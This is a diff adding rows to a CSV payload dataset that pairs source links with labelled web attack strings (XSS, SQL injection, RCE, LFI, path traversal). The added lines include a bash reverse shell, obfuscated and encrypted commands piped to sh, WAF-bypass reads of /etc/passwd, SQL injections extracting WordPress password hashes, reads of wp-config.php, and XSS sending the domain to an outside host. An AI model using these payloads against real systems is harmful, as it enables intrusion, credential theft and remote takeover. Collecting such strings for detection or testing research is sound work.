@@ -434,3 +434,25 @@ https://aidilarf.medium.com/cve-2023-26046-cve-2023-26047-xss-bypass-waf-at-tele
 https://www.mend.io/vulnerability-database/CVE-2022-23073,"<img src=a onerror=""var x=document.createElement('script');x.src='<attacker_server>/api.js';document.body.appendChild(x);"">",xss
 https://twitter.com/aboul3la/status/1286012324722155525,"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../",ptrav
 https://twitter.com/0x0SojalSec/status/1634612342855196674,"xss'''><iframe srcdoc='%26it;script>;prompt` ${document.domain}`%26it;/script>'>",xss
+https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit/blob/main/cacti.py,bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ipAddress/port%200%3E%261%27,rce
+https://pentest-tools.com/blog/exploit-rce-vulnerability-laravel-cve-2021-3129,php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log,rce
+https://medium.com/@mbdogrusoz/how-can-i-bypass-the-waf-7e12ccfc56f5,cat /???/??ss??,rce
+https://medium.com/@mbdogrusoz/how-can-i-bypass-the-waf-7e12ccfc56f5,cat /e??/p????? ,rce
+https://twitter.com/Un9nPlayer/status/1637769448172974081?cxt=HHwWgsCz5diow7otAAAA,"[""');alert('xss');//""]@xyz.xxx",xss
+https://twitter.com/gonzxph/status/1629064458218921984,javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain,xss
+https://twitter.com/sratarun/status/1637766648282116097,"<c/onpointerrawupdate=d=document,b=%27%60%27,d[%27loca%27%2B%27tion%27]=%27javascript%26colon;aler%27%2B%27t%27%2Bb%2Bdomain%2Bb>",xss
+https://twitter.com/ghostofwhowas/status/1636925877547069440,"echo '61776b20277b7072696e742024307d27202f3f3f2a632f3f2a7764' | xxd -p -r | sh echo ""U2FsdGVkX19AYgtqPB2JND9fswlDf/i2ZWP8FUTyqHS+7EUuA2meAMm9Cd1Z67lq1+e5qEUyJmBsvFsu5yzI3aftPy8q/qjIwVo8feoh1JM="" | openssl enc -d -des3 -base64 -pass pass:bex -pbkdf2 | sh | sh",rce
+https://twitter.com/rootxvishal/status/1641920769046511616,<svg/onload=location/**/='http://GH0ST.xss.ht/'+document.dom�,xss
+https://twitter.com/guzfr1ng/status/1639531453393322006,autofocus ' onfocus='alert(document.domain)',xss
+https://twitter.com/guzfr1ng/status/1639531453393322006,"""autofocus onfocus='alert(document.domain)' ",xss
+https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922,%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE,xss
+https://gitee.com/wkstestete/cve/blob/master/sql/ibos%20sql%20injection3.md,"""') AND (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- qw""",sqli
+https://wpscan.com/vulnerability/a6c1676d-9dcb-45f6-833a-9545bccd0ad6,"f'1) UNION SELECT 1,{title},concat(""fa fa-"",user_pass),3,4,5,6 from wp_users%23",sqli
+https://wpscan.com/vulnerability/39c964fa-6d8d-404d-ac38-72f6f88d203c,action=parse-media-shortcode&post_ID=1&shortcode=[gigpress_related_shows sort=' AND (SELECT 42 FROM (SELECT(SLEEP(2)))b),sqli
+https://wpscan.com/vulnerability/b027a8db-0fd6-444d-b14a-0ae58f04f931,%3C/script%3E%3Cimg%20src%3D1%20onerror%3Dalert(/xss/),xss
+https://wpscan.com/vulnerability/1b5a018d-f2d4-4373-be1e-5162cc5c928b,1%20AND%20(SELECT%209312%20FROM%20(SELECT(SLEEP(5)))hYkP,sqli
+https://wpscan.com/vulnerability/025a47f0-eddc-46dd-b994-e1e824dc5225,../../../wp-config.php ,lfi
+https://wpscan.com/vulnerability/221bf87b-69e2-4c53-971e-8516b798c759,111+AND+(SELECT+5926+FROM+(SELECT(SLEEP(5)))erUA) ,sqli
+https://wpscan.com/vulnerability/3ec56fe0-5297-40be-89d0-282a2e9938bc,1&a%2522%253e%253cscript%253ealert%2528/xss/%2529%253c%252fscript%253e,xss
+https://wpscan.com/vulnerability/6cedb27f-6140-4cba-836f-63de98e521bf,%3Cscript%3Ealert(`xss`)%3C/script%3E,xss
+https://twitter.com/0SPwn/status/1651740036717576195,"""><a href=jav&#x0D;ascript&colon;top[8680439..toString(30)](document.domain)>Click</a>",xss
